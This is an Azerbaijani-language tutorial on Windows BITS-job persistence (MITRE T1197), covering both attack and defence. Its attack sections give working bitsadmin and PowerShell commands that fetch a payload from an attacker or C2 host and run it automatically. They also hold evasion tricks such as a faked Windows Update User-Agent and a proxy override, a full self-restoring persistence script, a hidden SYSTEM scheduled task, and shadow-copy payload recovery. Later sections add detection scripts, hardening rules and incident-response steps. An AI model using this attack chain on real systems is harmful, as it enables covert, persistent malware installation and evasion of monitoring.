# BITS Persistence — Tam İzah 


---

## BÖLMƏ 1: NƏZƏRİYYƏ — BITS və Hücum Məntiqi

### 1.1 BITS nədir?

**BITS (Background Intelligent Transfer Service)** — Windows-un qanuni, Microsoft tərəfindən imzalanmış fayl transfer xidmətidir. Windows Update, Microsoft Defender, SCCM və s. ondan istifadə edir.

**BITS-in dizayn xüsusiyyətləri (qanuni istifadə üçün):**

| Xüsusiyyət | İzah |
|---|---|
| **Asinxron transfer** | Fayllar arxa planda, istifadəçinin işinə mane olmadan yüklənir |
| **Şəbəkə adaptasiyası** | Boş bant genişliyindən istifadə edir, trafiki dinamik tənzimləyir |
| **Dayanıqlılıq** | Bağlantı kəsiləndə transfer dayanmır, davam etdirilir |
| **Prioritet sistemi** | FOREGROUND, HIGH, NORMAL, LOW |
| **Reboot dözümlülüyü** | Kompüter yenidən başlasa da job yadda qalır və davam edir |

### 1.2 Hücumçular BITS-i niyə sevir? (5 əsas səbəb)

1. **Qanuni sistem komponenti** — Microsoft-un imzaladığı xidmət olduğu üçün AV/EDR-lər nadir hallarda bloklayır (whitelisting-dən keçir).
2. **Persistence** — Reboot-dan sonra da job-lar aktiv qalır.
3. **Stealth** — "Low and slow" trafik: fayllar hissə-hissə ötürülür → IDS/IPS imzaları işləmir.
4. **SYSTEM konteksti** — BITS xidməti SYSTEM hüquqları ilə işləyir.
5. **AppLocker bypass** — İmzalanmış binary olduğu üçün AppLocker qaydalarından keçir.

### 1.3 BITS arxitekturası

```
[Application Layer]
    ↓
[BitsAdmin.exe / PowerShell BITS cmdletləri]   ← hücumçu buradan istifadə edir
    ↓
[BITS Service (qmgr.dll)]                       ← job-ları idarə edir
    ↓
[BITS Job Manager]
    ↓
[HTTP(S) / SMB / UNC Protocol Handlers]
    ↓
[Network Layer]
```

**Əsas komponentlər:**
- `qmgr.dll` — BITS Manager (bütün job-ları idarə edir)
- `bitsadmin.exe` — Command-line utility (C:\Windows\System32\)
- PowerShell cmdletləri: `Start-BitsTransfer`, `Get-BitsTransfer`, `Remove-BitsTransfer`
- Event Log: `Microsoft-Windows-Bits-Client/Operational`

---

## BÖLMƏ 2: HÜCUMUN PRAKTİKİ İCRAASI

### Addım 1: Target maşına daxil olmaq və yoxlama

```powershell
# Windows-a administrator hüquqları ilə daxil olun
# BITS xidmətinin aktiv olduğunu yoxlayın
Get-Service BITS
```

**İzah:** Hücum üçün administrator hüquqları lazımdır (job yaratmaq üçün). `Get-Service BITS` xidmətin statusunu göstərir — əgər "Running" deyilsə, `Start-Service BITS` ilə işə salmaq olar.

### Addım 2: Mövcud BITS job-larını yoxlamaq

```cmd
:: Bütün BITS job-larını siyahıla
bitsadmin /list /allusers

:: Job-un ətraflı statusu
bitsadmin /list /allusers /verbose
```

```powershell
# PowerShell alternativi
Get-BitsTransfer -AllUsers
```

**İzah:** Bu əmrlər target-də mövcud job-ları göstərir. Hücumçu buradan iki şey öyrənir: (1) sistemdə artıq şübhəli job yoxdurmu, (2) hədəf BITS-i necə istifadə edir (normal trafik profili nədir — stealth üçün vacibdir).

### Addım 3: Payload üçün web server (Kali Linux-da)

```bash
# Kali Linux-da (hücumçu maşın)
cd /path/to/payload
python3 -m http.server 8080

# Və ya Apache/Nginx istifadə edin
# reverse_shell.exe faylını host edin
```

**İzah:** Payload (`reverse_shell.exe`, `beacon.exe` və s.) hücumçu maşında host edilir. `python3 -m http.server 8080` sadə HTTP server qurur — payload `http://<kali-ip>:8080/payload.exe` ünvanından endiriləcək. Əsl hücumda bu, C2 server və ya qanuni görünən bir domain ola bilər.

### Addım 4: Yeni BITS job yaratmaq (əsas əmrlər)

```cmd
:: Job yaradılması - Download işi
bitsadmin /create /download MaliciousUpdate

:: URL təyin etmə
bitsadmin /addfile MaliciousUpdate http://192.168.1.100:8080/payload.exe C:\Windows\Temp\update.exe

:: Prioritet təyin etmə (FOREGROUND - ən yüksək)
bitsadmin /setpriority MaliciousUpdate FOREGROUND

:: Job-u aktivləşdirmə
bitsadmin /resume MaliciousUpdate

:: Status yoxlama
bitsadmin /info MaliciousUpdate /verbose
```

**Hər sətrin izahı:**

| Əmr | Nə edir |
|---|---|
| `/create /download` | Yeni download job yaradır (addım 1: yalnız yaradılır, işləmir) |
| `/addfile <job> <URL> <yerli_yol>` | Mənbə URL-dən hədəf yola yükləmə tapşırığını əlavə edir. **Diqqət:** `C:\Windows\Temp\` kimi qovluqlar seçilir, çünki orada gözə dəymir |
| `/setpriority ... FOREGROUND` | Prioriteti ən yüksəkə qaldırır → transfer dərhal başlayır |
| `/resume` | Job-u aktivləşdirir → transfer başlayır |
| `/info ... /verbose` | Job-un GUID, state, fayl siyahısı, notify ayarlarını göstərir |

### Addım 5: Execute mexanizmi — ən vacib hissə!

```cmd
:: Job tamamlandıqda icra ediləcək əmri təyin etmə
bitsadmin /setnotifycmdline MaliciousUpdate cmd.exe "/c C:\Windows\Temp\update.exe"
bitsadmin /setnotifyflags MaliciousUpdate 4
```

**İzah:** Bu iki əmr BITS-i "yükləyən + icra edən" bir alətə çevirir. Payload endirilən kimi avtomatik işə düşür — heç bir başqa alətə ehtiyac yoxdur.

**Notify flags — dəqiq dəyərlər (Microsoft rəsmi sənədləşməsi):**

| Dəyər | Hadisə | Nə vaxt işləyir |
|---|---|---|
| `1` | Transfer tamamlandı | Fayl endirildikdə → ən çox istifadə edilən |
| `2` | Xəta | Transfer uğursuz olduqda |
| `3` | Transfer tamamlandı VƏ YA xəta | Hər iki halda (1+2) |
| `4` | Job dəyişdirildi | Job-un state-i dəyişəndə (tamamlanma da state dəyişikliyidir → icra baş verir) |

> ⚠️ **Texniki qeyd:** Sənəddə "4 = transferred | error" yazılıb — bu tam dəqiq deyil. Rəsmi olaraq `4` job-un **modifikasiyası** deməkdir; `transferred | error` kombinasiyası `3`-dür. Praktikada `4` də işləyir, çünki job tamamlananda state dəyişir və notify command tetiklenir. Rəsmi sənədlərə uyğun ən etibarlı seçim `1` və ya `3`-dür.

### Addım 6: PowerShell alternativi (Asinxron yükləmə)

```powershell
$job = Start-BitsTransfer `
    -Source "http://c2-server.com/payload.exe" `
    -Destination "C:\ProgramData\Microsoft\Windows\update_cache.exe" `
    -Asynchronous `
    -Priority High `
    -RetryInterval 60 `
    -RetryTimeout 120
```

**İzah:**
- `-Asynchronous` — əmri bloklamadan job-u arxa planda yaradır (script davam edə bilər)
- `-RetryInterval 60` — uğursuz cəhddən sonra 60 saniyə gözlə
- `-RetryTimeout 120` — 120 saniyədən çox cəhd etmə
- **Qeyd:** `Start-BitsTransfer` ilə notify command təyin etmək **mümkün deyil** — bunun üçün mütləq `bitsadmin /setnotifycmdline` lazımdır. Buna görə də hücum zəncirində hər ikisi birlikdə istifadə olunur.

### Advanced konfiqurasiya — gizlənmə üsulları

```cmd
:: İnkişaf etmiş BITS job konfiqurasiyası
bitsadmin /create /download UpdateService
bitsadmin /addfile UpdateService https://legitimate-looking-domain.com/update.cab C:\ProgramData\winupdate.exe

:: Retry konfiqurasiyası
bitsadmin /setminretrydelay UpdateService 60
bitsadmin /setnoprogresstimeout UpdateService 120

:: Custom HTTP headers (legitimate görünmək üçün)
bitsadmin /setcustomheaders UpdateService "User-Agent: Windows-Update-Agent/10.0"
bitsadmin /setcustomheaders UpdateService "Accept: */*"

:: Proxy bypass
bitsadmin /setproxysettings UpdateService OVERRIDE ""

:: Authentication (əgər target daxili şəbəkədədirsə)
bitsadmin /setcredentials UpdateService TARGET_DOMAIN USERNAME PASSWORD

:: Execute on complete
bitsadmin /setnotifycmdline UpdateService "%COMSPEC%" "/c start /b C:\ProgramData\winupdate.exe"
bitsadmin /setnotifyflags UpdateService 4

:: Resume job
bitsadmin /resume UpdateService
```

**Hər fəndin izahı:**

| Parametr | Məqsəd |
|---|---|
| `UpdateService` adı | Qanuni Windows xidməti kimi görünən job adı |
| `update.cab` uzantısı | Windows Update faylları `.cab` formatındadır → SOC analisti şübhələnmir |
| `C:\ProgramData\` hədəfi | İstifadəçi kontekstindən kənar, gözdən uzaq qovluq |
| `User-Agent: Windows-Update-Agent/10.0` | HTTP trafikində Windows Update agenti kimi görünür → proxy/log analizini aldadır |
| `setproxysettings OVERRIDE ""` | Proxy konfiqurasiyasını ləğv edir → korporativ proxy monitorinqindən yayınır |
| `%COMSPEC%` | `cmd.exe`-ə işarə edir — daha az şübhəli görünür |
| `start /b` | İcranı arxa planda, yeni pəncərə açmadan başladır |

---

## BÖLMƏ 3: PERSISTENCE MEXANİZMİ — Checker Skripti (Tam Kod + İzah)

Bu skript BITS job-unun "öldürülməməsini" təmin edir. Əgər job silinsə, xəta versə və ya payload icra olunmasa — skript hər şeyi bərpa edir.

```powershell
# BITS_Persistence_Checker.ps1
# Bu skript BITS job-unun aktivliyini yoxlayır və lazım olduqda yenidən yaradır

param(
    [string]$JobName = "UpdateService",
    [string]$PayloadURL = "https://legitimate-domain.com/update.cab",
    [string]$DestinationPath = "C:\ProgramData\winupdate.exe",
    [string]$CommandLine = "cmd.exe /c start /b C:\ProgramData\winupdate.exe",
    [string]$LogPath = "C:\ProgramData\Microsoft\Windows\bits_checker.log"
)
```

**İzah:** Parametrlər default dəyərlərlə təyin olunur — skript heç bir arqument olmadan işlədilə bilər. `LogPath` məntiqli yerdədir: `C:\ProgramData\Microsoft\Windows\` — Windows-un öz qovluğu, orada log faylı gözə dəymir.

```powershell
function Write-Log {
    param([string]$Message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Message" | Out-File -FilePath $LogPath -Append
    Write-Host $Message
}
```

**İzah:** Hər mesajı həm konsola yazır, həm də log faylına əlavə edir (timestamp ilə). Incident response zamanı hücumçu nə vaxt nə etdiyini izləyə bilir.

```powershell
function Check-BITSJob {
    param([string]$JobName)
    
    try {
        # BITS job-unu yoxla
        $job = Get-BitsTransfer -Name $JobName -ErrorAction Stop
        $jobStatus = $job.JobState
        
        Write-Log "BITS Job '$JobName' status: $jobStatus"
        
        switch ($jobStatus) {
            "Transferred" {
                # Job tamamlanıb - execute edildiyini yoxla
                if (Test-Path $DestinationPath) {
                    Write-Log "Payload file exists. Checking if process is running..."
                    $processRunning = Get-Process | Where-Object { $_.Path -eq $DestinationPath }
                    if (-not $processRunning) {
                        Write-Log "Process not running. Executing payload..."
                        Start-Process -FilePath $DestinationPath -WindowStyle Hidden
                    }
                }
                
                # Job-u yenidən başlat (növbəti persistence üçün)
                Remove-BitsTransfer -Name $JobName -Confirm:$false
                Create-BITSJob
            }
            "Error" {
                Write-Log "Job error detected. Recreating..."
                Remove-BitsTransfer -Name $JobName -Confirm:$false
                Create-BITSJob
            }
            "Connecting", "Transferring", "Queued" {
                Write-Log "Job is active. No action needed."
            }
            default {
                Write-Log "Unknown state: $jobStatus. Recreating job..."
                Create-BITSJob
            }
        }
    }
    catch {
        Write-Log "Job not found or error: $_. Creating new job..."
        Create-BITSJob
    }
}
```

**Funksiyanın məntiqi — state maşını:**

| Job State | Skriptin reaksiyası |
|---|---|
| **Transferred** | Fayl endirilib. Əvvəlcə faylın mövcudluğunu yoxla → sonra process-in işlədiyini yoxla (`Get-Process` ilə `Path` filtr) → işləmirsə `Start-Process -WindowStyle Hidden` ilə gizli icra et → sonra job-u sil və **yenidən yaradır** (sonsuz dövrə = davamlı persistence) |
| **Error** | Job-u sil, sıfırdan yarat (URL dəyişibsə və ya keçici xəta olubsa bərpa) |
| **Connecting / Transferring / Queued** | Job aktivdir, müdaxilə etmə |
| **Başqa state / Job tapılmadı (catch)** | Biri job-u silibsə → dərhal yenidən yarat |

> **Əsas məntiq:** Hücumçu job-u silmək istənilən anda skript onu 10 dəqiqə ərzində bərpa edir (Scheduled Task vasitəsilə).

```powershell
function Create-BITSJob {
    param()
    
    try {
        Write-Log "Creating BITS job: $JobName"
        
        # BITSAdmin ilə yeni job yaratmaq
        $createCmd = "bitsadmin /create /download $JobName"
        $addFileCmd = "bitsadmin /addfile $JobName $PayloadURL $DestinationPath"
        $notifyCmd = "bitsadmin /setnotifycmdline $JobName `"$CommandLine`""
        $notifyFlags = "bitsadmin /setnotifyflags $JobName 4"
        $resumeCmd = "bitsadmin /resume $JobName"
        
        cmd.exe /c $createCmd | Out-Null
        cmd.exe /c $addFileCmd | Out-Null
        cmd.exe /c $notifyCmd | Out-Null
        cmd.exe /c $notifyFlags | Out-Null
        cmd.exe /c $resumeCmd | Out-Null
        
        Write-Log "BITS job created successfully"
        
        # Alternativ olaraq PowerShell ilə
        # Start-BitsTransfer -Source $PayloadURL -Destination $DestinationPath -Asynchronous -DisplayName $JobName
        
        return $true
    }
    catch {
        Write-Log "Failed to create BITS job: $_"
        return $false
    }
}
```

**İzah:** Job-u sıfırdan quran funksiya. 5 addımlı zəncir: **yarat → fayl əlavə et → notify əmri təyin et → notify flag təyin et → resume et**. `cmd.exe /c` istifadə olunur, çünki `bitsadmin` əmrləri PowerShell-də birbaşa çağırılanda bəzən argument parse problemləri yaradır. `| Out-Null` çıxışı gizlədir — həm stealth, həm də təmiz konsol üçün.

```powershell
function Monitor-JobIntegrity {
    param()
    
    # Registry-də BITS job qalıqlarını yoxla
    $bitsRegistry = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\BITS\StateIndex"
    if (Test-Path $bitsRegistry) {
        Write-Log "BITS state index exists"
    }
    
    # Event Log yoxlaması
    $bitsEvents = Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -MaxEvents 50 | 
                  Where-Object { $_.Message -match $JobName }
    
    if ($bitsEvents) {
        Write-Log "Found $($bitsEvents.Count) related BITS events in logs"
    }
}
```

**İzah:** İki yerdən job-un izlərini yoxlayır:
1. **Registry** — `HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\BITS\StateIndex` — BITS job-larının state məlumatları burada saxlanılır. Skript öz "ayaq izlərini" yoxlayır — job silinsə belə registry qalıqları qala bilər.
2. **Event Log** — Öz job adı ilə bağlı event-ləri axtarır → müdafiə tərəfi (SOC) job-u aşkarlayıbmı, bunu ölçür.

```powershell
# Əsas execution loop
Write-Log "=== BITS Persistence Checker Started ==="

# Tək execution üçün
Check-BITSJob -JobName $JobName
Monitor-JobIntegrity

# Davamlı monitoring üçün (Scheduled Task ilə)
# while ($true) {
#     Check-BITSJob -JobName $JobName
#     Start-Sleep -Seconds 300  # 5 dəqiqədən bir yoxla
# }
```

**İzah:** Skript işə düşəndə: log yazır → job-u yoxlayır → izləri yoxlayır. `while` dövrəsi şərh halındadır, çünki sonsuz dövrə əvəzinə Scheduled Task hər 10 dəqiqədən bir skripti yenidən işə salır (daha etibarlı və daha az şübhəli — proses siyahısında daim görünən PowerShell process-i yoxdur).

---

## BÖLMƏ 4: SCHEDULED TASK + VSS (İkinci və Üçüncü Qat)

### 4.1 Scheduled Task — skripti daim işlək saxlayan mexanizm

```powershell
# Scheduled Task yaradılması
$action = New-ScheduledTaskAction `
    -Execute "PowerShell.exe" `
    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"C:\ProgramData\Microsoft\Windows\BITS_Persistence_Checker.ps1`""

$trigger = New-ScheduledTaskTrigger `
    -AtStartup `
    -RepetitionInterval (New-TimeSpan -Minutes 10) `
    -RepetitionDuration (New-TimeSpan -Days 365)

$principal = New-ScheduledTaskPrincipal `
    -UserId "SYSTEM" `
    -LogonType ServiceAccount `
    -RunLevel Highest

$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -RestartCount 3 `
    -RestartInterval (New-TimeSpan -Minutes 1) `
    -Hidden

Register-ScheduledTask `
    -TaskName "Windows Update Service Monitor" `
    -Action $action `
    -Trigger $trigger `
    -Principal $principal `
    -Settings $settings `
    -Description "Monitors Windows Update components and ensures continuous operation" `
    -Force

# Task-ı aktivləşdirmə
Start-ScheduledTask -TaskName "Windows Update Service Monitor"
```

**Hər parametrin izahı:**

| Parametr | Dəyər | Niyə? |
|---|---|---|
| `-Execute PowerShell.exe` | — | Checker skriptini işlədəcək |
| `-ExecutionPolicy Bypass` | — | PowerShell-in script icra siyasətini keçir |
| `-WindowStyle Hidden` | — | Pəncərə açılmır (stealth) |
| `-AtStartup` | Trigger | Sistem açılan kimi işə düşür |
| `-RepetitionInterval 10 dəq` | — | Hər 10 dəqiqədən bir təkrarlanır → job silinsə maksimum 10 dəqiqə ərzində bərpa olunur |
| `-RepetitionDuration 365 gün` | — | Bir il boyunca davam edir |
| `-UserId SYSTEM` | Principal | Task SYSTEM hüquqları ilə işləyir → heç bir istifadəçi kontekstindən asılı deyil |
| `-LogonType ServiceAccount` | — | Şifrə tələb etmir |
| `-RunLevel Highest` | — | UAC bypass — tam hüquqlar |
| `-RestartCount 3 / RestartInterval 1 dəq` | — | Task uğursuz olarsa 3 dəfə yenidən cəhd edir |
| `-Hidden` | — | Task Scheduler-da gizli qeyd olunur |
| Task adı: `"Windows Update Service Monitor"` | — | Qanuni Windows xidməti kimi görünən ad |

### 4.2 VSS Persistence — üçüncü qat (payload faylını qoruma)

```powershell
# Volume Shadow Copy ilə backup persistence
# Əgər əsas fayl silinsə, VSS-dən bərpa et

$checkerScript = @'
# BITS Job Recovery from VSS
$vssPath = "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\ProgramData\winupdate.exe"
if (-not (Test-Path "C:\ProgramData\winupdate.exe")) {
    if (Test-Path $vssPath) {
        Copy-Item $vssPath "C:\ProgramData\winupdate.exe" -Force
        Start-Process "C:\ProgramData\winupdate.exe" -WindowStyle Hidden
    }
}
'@
```

**İzah:** Əgər SOC payload faylını silərsə, bu skript onu **Volume Shadow Copy-dən** bərpa edir:
1. `C:\ProgramData\winupdate.exe` yoxdursa...
2. VSS snapshot-dakı kopyanı (`\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\...`) yoxlayır
3. Faylı bərpa edir və gizli şəkildə icra edir

> **Praktik qeyd:** Bu metodun işləməsi üçün VSS snapshot-un olması lazımdır (adətən System Restore və ya backup proqramları tərəfindən yaradılır). Hücumçu bəzən özü `vssadmin create shadow` ilə snapshot yaradır, sonra payload-u ora qoyur.

---

## BÖLMƏ 5: AŞKARLAMA — MÜDAFİƏ TƏRƏFİ

### 5.1 Event Log Analizi

```powershell
# BITS Event Log-u yoxlamaq
Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -MaxEvents 1000 |
    Where-Object {
        $_.Id -in @(3, 4, 59, 60, 164, 165)
    } |
    Select-Object TimeCreated, Id, Message |
    Format-List

# Event ID təsvirləri:
# 3  - Job yaradıldı
# 4  - Job-a fayl əlavə edildi  
# 59 - Job transfer başladı
# 60 - Job transfer tamamlandı
# 164 - Job yenidən başladıldı
# 165 - Job konfiqurasiyası dəyişdirildi
```

**İzah:** BITS-in bütün vacib əməliyyatları `Microsoft-Windows-Bits-Client/Operational` log-una yazılır. Bu 6 Event ID hücumun bütün həyat dövrünü əhatə edir: yaratma (3) → fayl əlavə (4) → transfer başla (59) → tamamlan (60) → restart (164) → dəyişiklik (165). SOC bu log-u SIEM-ə axıdıb alert qurmalıdır.

```powershell
# Şübhəli BITS joblarını aşkarlama
$suspiciousEvents = Get-WinEvent -LogName "Microsoft-Windows-Bits-Client/Operational" -MaxEvents 5000 |
    Where-Object {
        $_.Id -eq 3 -and
        ($_.Message -match "cmd.exe" -or 
         $_.Message -match "powershell.exe" -or
         $_.Message -match "\.exe" -or
         $_.Message -match "temp|tmp|appdata|programdata")
    }

if ($suspiciousEvents) {
    Write-Warning "Suspicious BITS jobs detected!"
    $suspiciousEvents | Format-Table TimeCreated, Id, Message -AutoSize
}
```

**İzah:** Aşkarlama məntiqi — yeni yaradılan job-ların (Event ID 3) mesajında aşağıdakılardan biri varsa şübhəlidir:
- `cmd.exe` / `powershell.exe` — notify command kimi shell istifadəsi
- `.exe` — "normal" BITS yükləmələri `.cab`, `.msu`, `.psf` formatlarındadır
- `temp|tmp|appdata|programdata` — şübhəli hədəf qovluqlar

### 5.2 PowerShell Detection Script

```powershell
# BITS_Detection.ps1
function Get-SuspiciousBITSJobs {
    $suspicious = @()
    
    # Bütün BITS job-larını əldə et
    $allJobs = bitsadmin /list /allusers /verbose | Select-String -Pattern "GUID|DISPLAY|NOTIFY|URL|LOCAL"
    
    # BITS transfer-ləri yoxla
    $transfers = Get-BitsTransfer -AllUsers -ErrorAction SilentlyContinue
    
    foreach ($transfer in $transfers) {
        $jobCheck = @{
            JobName = $transfer.DisplayName
            JobState = $transfer.JobState
            FileList = $transfer.FileList
            Suspicious = $false
            Reasons = @()
        }
        
        # Şübhəli göstəricilər
        if ($transfer.DisplayName -notmatch "^(Windows|Microsoft|Update|Defender)") {
            $jobCheck.Suspicious = $true
            $jobCheck.Reasons += "Unusual job name"
        }
        
        foreach ($file in $transfer.FileList) {
            if ($file.LocalName -match "(?i)(temp|tmp|appdata|public|downloads|desktop)") {
                $jobCheck.Suspicious = $true
                $jobCheck.Reasons += "Download to suspicious directory: $($file.LocalName)"
            }
            
            if ($file.RemoteName -notmatch "^https?://(update\.microsoft|.*\.windows\.com|.*\.microsoft\.com)") {
                $jobCheck.Suspicious = $true
                $jobCheck.Reasons += "Suspicious remote URL: $($file.RemoteName)"
            }
        }
        
        # Notify command yoxla
        $jobInfo = bitsadmin /info $transfer.JobId /verbose | Select-String "NOTIFY COMMAND"
        if ($jobInfo -match "(cmd|powershell|wscript|cscript|rundll32|regsvr32)") {
            $jobCheck.Suspicious = $true
            $jobCheck.Reasons += "Suspicious notify command"
        }
        
        if ($jobCheck.Suspicious) {
            $suspicious += $jobCheck
        }
    }
    
    return $suspicious
}

# Detection execution
$suspiciousJobs = Get-SuspiciousBITSJobs
if ($suspiciousJobs.Count -gt 0) {
    Write-Host "[!] Suspicious BITS jobs found: $($suspiciousJobs.Count)" -ForegroundColor Red
    $suspiciousJobs | Format-List
} else {
    Write-Host "[+] No suspicious BITS jobs detected" -ForegroundColor Green
}
```

**Deteksiya qaydaları (3 IOC):**

| Yoxlama | Şübhəli sayılan hal | Nümunə |
|---|---|---|
| **Job adı** | `Windows/Microsoft/Update/Defender` ilə başlamayan adlar | `MaliciousUpdate`, `UpdateService` |
| **Hədəf qovluq** | `temp`, `tmp`, `appdata`, `public`, `downloads`, `desktop` | `C:\Windows\Temp\update.exe` |
| **Remote URL** | `*.microsoft.com` / `*.windows.com` olmayan URL | `http://192.168.1.100:8080/...` |
| **Notify command** | `cmd`, `powershell`, `wscript`, `cscript`, `rundll32`, `regsvr32` | `cmd.exe /c ...` |

> **Qeyd:** Hücumçu bu deteksiyadan yayınmaq üçün adı `Windows Update Service` qoyur, `C:\ProgramData\` istifadə edir və qanuni görünən domain seçir. Buna görə də **yalnız bu qaydalar kifayət deyil** — notify command yoxlaması ən güclü göstəricidir, çünki qanuni BITS job-larında demək olar ki, heç vaxt notify command olmur.

---

## BÖLMƏ 6: QARŞISININ ALINMASI (HARDENING)

### 6.1 Group Policy / Registry

```powershell
# BITS-i məhdudlaşdırma üçün Group Policy
# Registry açarı:
$bitsPolicy = @"
Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\BITS]
"EnableBitsMaxBandwidth"=dword:00000001
"MaxBandwidthValidFrom"=dword:00000000
"MaxBandwidthValidTo"=dword:00000000
"MaxTransferRateOnSchedule"=dword:00000000
"MaxTransferRateOffSchedule"=dword:00000000

; BITS job-larını yalnız SYSTEM hesabı ilə məhdudlaşdır
[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\BITS\Client]
"EnableBITSMaxBandwidth"=dword:00000001
"MaxDownloadTime"=dword:00015180
"MaxNotificationTimeout"=dword:00015180
"@
```

**İzah:** BITS-in bandwidth və timeout parametrlərini məhdudlaşdırır. `MaxDownloadTime = 0x15180` (86400 saniyə = 24 saat) — hər hansı job maksimum 24 saat içində tamamlanmalıdır; hücumçu "low and slow" strategiyasını davam etdirə bilməz. Bu dəyərlər GPO vasitəsilə də tətbiq oluna bilər: `Computer Configuration → Administrative Templates → Network → Background Intelligent Transfer Service (BITS)`.

### 6.2 Windows Defender Firewall

```powershell
# BITS üçün firewall qaydaları
New-NetFirewallRule `
    -DisplayName "Restrict BITS Traffic" `
    -Direction Outbound `
    -Program "%SystemRoot%\System32\bitsadmin.exe" `
    -Action Block `
    -Profile Any

# Yalnız Windows Update üçün BITS-ə icazə
New-NetFirewallRule `
    -DisplayName "Allow BITS for Windows Update" `
    -Direction Outbound `
    -Program "%SystemRoot%\System32\bitsadmin.exe" `
    -RemoteAddress "*.windows.com","*.microsoft.com" `
    -Action Allow `
    -Profile Any
```

**İzah:** Əvvəl `bitsadmin.exe` üçün bütün outbound trafiki bloklanır, sonra yalnız Microsoft domaintlərinə icazə verilir. Nəticə: BITS yalnız `*.windows.com` və `*.microsoft.com`-dan yükləyə bilər → hücumçunun C2 URL-i avtomatik bloklanır. (Qeyd: Firewall qaydaları `RemoteAddress`-də wildcard domainləri məhdud dəstəkləyir — tam dəqiqlik üçün IP diapazonları və ya proxy-dən istifadə olunmalıdır.)

### 6.3 AppLocker Policy

```xml
<!-- AppLocker qaydası - BITSAdmin istifadəsini məhdudlaşdır -->
<RuleCollection Type="Exe" EnforcementMode="Enabled">
    <FilePublisherRule 
        Id="BITS_ADMIN_RESTRICT" 
        Name="Restrict BITSAdmin to Administrators"
        Description="Only allow administrators to use bitsadmin.exe"
        UserOrGroupSid="S-1-5-32-544" 
        Action="Allow">
        <Conditions>
            <FilePublisherCondition 
                PublisherName="O=MICROSOFT CORPORATION, L=REDMOND, S=WASHINGTON, C=US"
                ProductName="MICROSOFT® WINDOWS® OPERATING SYSTEM"
                BinaryName="BITSADMIN.EXE">
                <BinaryVersionRange LowSection="*" HighSection="*" />
            </FilePublisherCondition>
        </Conditions>
    </FilePublisherRule>
</RuleCollection>
```

**İzah:** `bitsadmin.exe` icrası yalnız **Administrators** qrupuna (`S-1-5-32-544`) icazə verir. Qayda publisher imzasına əsaslanır (Microsoft Corporation imzası) — buna görə də hücumçu faylı adını dəyişdirsə belə işləmir. Diqqət: AppLocker default olaraq Windows fayllarını icazəsiz də işlədə bilər (`%WINDIR%` qaydası) — buna görə bu qayda **default rule-lardan əvvəl** yoxlanmalıdır, ən yaxşısı `EnforcementMode` ilə birlikdə DLL və Script qaydalarını da əhatə etməkdir.

### 6.4 Sysmon Monitoring

```xml
<!-- Sysmon konfiqurasiyası - BITS monitoring -->
<Sysmon schemaversion="4.22">
    <EventFiltering>
        <!-- BITS Event Log monitoring -->
        <RuleGroup name="BITS Activity" groupRelation="or">
            <ProcessCreate onmatch="include">
                <CommandLine condition="contains">bitsadmin</CommandLine>
            </ProcessCreate>
            <ProcessCreate onmatch="include">
                <CommandLine condition="contains">Start-BitsTransfer</CommandLine>
            </ProcessCreate>
            <ProcessCreate onmatch="include">
                <CommandLine condition="contains">Get-BitsTransfer</CommandLine>
            </ProcessCreate>
        </RuleGroup>
        
        <!-- Notify command execution -->
        <RuleGroup name="BITS Notify Commands" groupRelation="or">
            <ProcessCreate onmatch="include">
                <ParentImage condition="end with">bitsadmin.exe</ParentImage>
            </ProcessCreate>
        </RuleGroup>
    </EventFiltering>
</Sysmon>
```

**İzah:** Sysmon iki şeyi izləyir:
1. **ProcessCreate** — kim `bitsadmin` və ya BITS PowerShell cmdletləri işlədirsə (Event ID 1)
2. **Notify command icrası** — parent process `bitsadmin.exe` olan hər hansı uşaq process (məsələn, `cmd.exe /c update.exe`) — bu, `/setnotifycmdline` ilə tetiklenen icranı tutur

---

## BÖLMƏ 7: İNCİDENT RESPONSE (Zərərsizləşdirmə)

Zərərsizləşdirmə sırası ilə:

```
1. Job-u dayandır:      bitsadmin /cancel <job_name>
2. Payload-u sil:       del C:\Windows\Temp\update.exe
3. Scheduled Task-ı sil:
   Unregister-ScheduledTask -TaskName "Windows Update Service Monitor" -Confirm:$false
4. Registry qalıqlarını təmizlə:
   HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\BITS\StateIndex
5. VSS kopyalarını sil: vssadmin delete shadows /for=C: /oldest
6. Event Log-larda araşdırma apar
7. Payload-un icra olunduğunu yoxla (process, autorun, digər persistence qalıqları)
```

**Kritik nöqtə:** Checker skripti + Scheduled Task kombinasiyası o deməkdir ki, **job-u sadəcə silmək kifayət deyil** — 10 dəqiqə ərzində yenidən yaradılacaq. Əvvəlcə Scheduled Task-ı, sonra VSS-i, ən sonda job-u silmək lazımdır.

---

## YEKUN XÜLASƏ

Bu texnika **MITRE ATT&CK T1197 (BITS Jobs)** kimi təsnif edilir və "Living off the Land" (LotL) strategiyasının klassik nümunəsidir.

**Hücum zəncirinin tam məntiqi:**

```
Payload host et (Kali) 
    → BITS job yarat (bitsadmin)
    → Notify command təyin et (icra mexanizmi)
    → Checker skript (job-u canlı saxlayır)
    → Scheduled Task (skripti hər 10 dəq işlədir)
    → VSS backup (faylı qoruyur)
    
= 3 qat persistence: job silinsə bərpa, fayl silinsə bərpa, skript dayandırılsa bərpa
```

**Müdafiə üçün ən vacib 3 addım:**
1. **Monitoring** — Event ID 3 + notify command yoxlaması (SIEM alerti)
2. **Firewall** — BITS trafikini yalnız Microsoft domaintlərinə məhdudlaşdır
3. **IR proseduru** — bütün qatları sıra ilə zərərsizləşdir (əks halda hər şey bərpa olunur)

